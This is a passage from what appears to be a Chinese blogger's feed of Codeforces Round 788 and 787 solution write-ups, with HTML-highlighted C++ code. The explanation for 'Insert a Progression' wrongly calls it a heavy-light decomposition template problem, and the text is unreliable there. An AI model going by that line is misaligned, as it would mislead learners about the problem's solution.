class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> spec[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(pos);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> x=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(!vis[x])&#123;</span><br><span class="line">            vis[x]=<span class="number">1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(b_[a[x]]);</span><br><span class="line">            q.<span class="built_in">push</span>(a_[b[x]]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[x]==b[x])&#123;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        a_[a[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;b[i];</span><br><span class="line">        b_[b[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;c[i];    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(i);</span><br><span class="line">            <span class="keyword">if</span>(res)&#123;</span><br><span class="line">                ans*=<span class="number">2</span>;</span><br><span class="line">                ans%=mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Very-Suspicious"><a href="#D-Very-Suspicious" class="headerlink" title="D. Very Suspicious"></a>D. Very Suspicious</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>计算几何，自己画一下会发现：三线相交得到6个，两线相交得到2个，线只有三种方向。每添加一条线凑成三线相交，方案数+4，与其它不平行的线相交，每多一个方案数+2。然后打一遍表，把 <code>1e9</code> 以内的答案跑出来最后二分寻找答案即可。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn],a_[maxn],b_[maxn],c[maxn],vis[maxn]; </span><br><span class="line"><span class="keyword">int</span> ans[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> d=<span class="built_in">lower_bound</span>(ans,ans+maxn,n)-ans;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">3</span>]=&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(ans,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line">    ans[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    ans[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    ans[<span class="number">3</span>]=<span class="number">6</span>;</span><br><span class="line">    ans[<span class="number">4</span>]=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(;cnt&lt;=<span class="number">1e9</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> sel=i%<span class="number">3</span>;</span><br><span class="line">        cnt+=(num[(sel+<span class="number">1</span>)%<span class="number">3</span>]+num[(sel+<span class="number">2</span>)%<span class="number">3</span>]<span class="number">-2</span>)*<span class="number">2</span>;</span><br><span class="line">        cnt+=<span class="number">4</span>;</span><br><span class="line">        num[sel]++;</span><br><span class="line">        ans[i+<span class="number">1</span>]=cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这波也是上大分，上了38分，希望再接再厉，争取快点上紫。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1670&quot;&gt;Codeforces Round #788 (Div. 2)&lt;/a&gt;题解。&lt;/p&gt;
&lt;p&gt;实况在&lt;a href=&quot;https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>Codeforces Round 787(Div.3)题解</title>
    <link href="http://example.com/2022/05/06/Codeforces%20Round%20787(Div.3)/"/>
    <id>http://example.com/2022/05/06/Codeforces%20Round%20787(Div.3)/</id>
    <published>2022-05-06T08:00:00.000Z</published>
    <updated>2022-05-07T10:26:30.592Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1675">Codeforces Round #787 (Div. 3)</a> 题解来了。</p><p>实况在<a href="https://www.bilibili.com/video/bv1eF411j7Uz">这里</a></p><span id="more"></span><h2 id="A-Food-for-Animals"><a href="#A-Food-for-Animals" class="headerlink" title="A. Food for Animals"></a>A. Food for Animals</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你猫粮，狗粮和猫和狗都能吃的粮的个数，再给你猫狗的个数，问能否使得猫狗都有一份粮食能吃。这里我操之过急，导致WA了一发，血亏。就是说你可以先判断狗粮是否够，如果不够则通用粮食减去剩余的数目，然后在判断通用粮食和猫粮是否大于等于猫的个数就行了，但是非常要注意，通用粮食的个数不能出现负数，因为这里没判断wa了一发，很难。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">5</span>];</span><br><span class="line">    cin&gt;&gt;num[<span class="number">1</span>]&gt;&gt;num[<span class="number">2</span>]&gt;&gt;num[<span class="number">3</span>]&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    num[<span class="number">3</span>]-=<span class="built_in">max</span>(<span class="number">0</span>,x-num[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(num[<span class="number">3</span>]&lt;<span class="number">0</span>)<span class="function">NO</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    <span class="title">if</span><span class="params">(num[<span class="number">2</span>]+num[<span class="number">3</span>]&gt;=y)</span></span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Make-It-Increasing"><a href="#B-Make-It-Increasing" class="headerlink" title="B. Make It Increasing"></a>B. Make It Increasing</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你一个数组，一次操作可以让它整除2，问最后能通过最少多少次操作让序列严格递增。因为操作只会使得数字变小，那么我们不难得到，如果要让它操作次数最小，最后一个数不能动。然后依次往前，如果前面的比后面的大那就进行一次操作，直到 <code>a[i]&lt;a[i-1]||a[i]==0</code> 因为到0了整除就不会变了，因此这个条件需要加上去。</p><p>最后只需要判断第一个数和第二个数是否都为0即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i]&gt;=a[i+<span class="number">1</span>]&amp;&amp;a[i])&#123;</span><br><span class="line">            a[i]/=<span class="number">2</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">1</span>]==<span class="number">0</span>&amp;&amp;a[<span class="number">2</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);    </span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Detective-Task"><a href="#C-Detective-Task" class="headerlink" title="C. Detective Task"></a>C. Detective Task</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>一开始还以为是逻辑推理题，正面思考无果之后发现一点：当一个人是小偷的时候，这个人前面全为1或者?，后面全为0或者?当遍历第 i 个人的时候，<code>cnt(?|1)=i-1 cnt(?|0)=n-i</code></p><p>如果要判断这个人是不是小偷，只需要看其他人说的全为真话时， 能否证明它是小偷，因此我就不用管它说了什么，直接滚动过去判断就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    s[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> cnt1=<span class="number">0</span>,cnt0=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)cnt0++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">            cnt0--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i<span class="number">-1</span>]==<span class="string">&#x27;?&#x27;</span>||s[i<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            cnt1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt0==len-i&amp;&amp;cnt1==i<span class="number">-1</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>树链剖分板题，而且只要轻重链剖分完了就可以直接输出了。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span 